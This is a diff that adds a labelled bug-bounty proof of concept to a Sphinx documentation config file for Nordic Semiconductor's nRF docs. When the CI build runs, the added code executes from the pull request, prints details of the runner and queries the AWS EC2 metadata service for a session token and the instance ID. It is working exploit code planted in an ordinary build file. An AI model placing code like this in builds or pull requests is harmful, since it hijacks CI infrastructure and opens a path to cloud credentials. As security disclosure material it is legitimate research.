@@ -187,6 +187,39 @@ external_content_contents = [
 ]
 external_content_keep = ["versions.txt"]
 
+# --- PoC: Nordic Semiconductor bug bounty (authorized security research) ---
+# This block demonstrates that pull-request-controlled Python code executes on
+# the CI runner during the documentation build. It only prints runner
+# information and probes the EC2 metadata service for reachability; it does
+# NOT read or exfiltrate any credentials.
+import platform  # noqa: E402
+
+print(
+    f"[PoC] Arbitrary PR-controlled code executed from doc/nrf/conf.py on runner "
+    f"'{platform.node()}' ({platform.system()} {platform.release()})"
+)
+try:
+    import urllib.request  # noqa: E402
+
+    _ua = "security-research -BugBounty-nordic-semiconductor-31337"  # program hunting policy
+    _req = urllib.request.Request(
+        "http://169.254.169.254/latest/api/token",
+        method="PUT",
+        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60", "User-Agent": _ua},
+    )
+    _token = urllib.request.urlopen(_req, timeout=3).read().decode()
+    _req2 = urllib.request.Request(
+        "http://169.254.169.254/latest/meta-data/instance-id",
+        headers={"X-aws-ec2-metadata-token": _token, "User-Agent": _ua},
+    )
+    _iid = urllib.request.urlopen(_req2, timeout=3).read().decode()
+    print(f"[PoC] AWS EC2 metadata service is reachable from the runner. instance-id: {_iid}")
+    print("[PoC] IAM credentials NOT read (program rules); reachability proves the "
+          "runner is an EC2 host inside the Nordic AWS environment.")
+except Exception as _e:  # noqa: BLE001
+    print(f"[PoC] IMDS probe result: {_e}")
+# --- end PoC ---
+
 # Options for table_from_rows --------------------------------------------------
 
 table_from_rows_base_dir = NRF_BASE
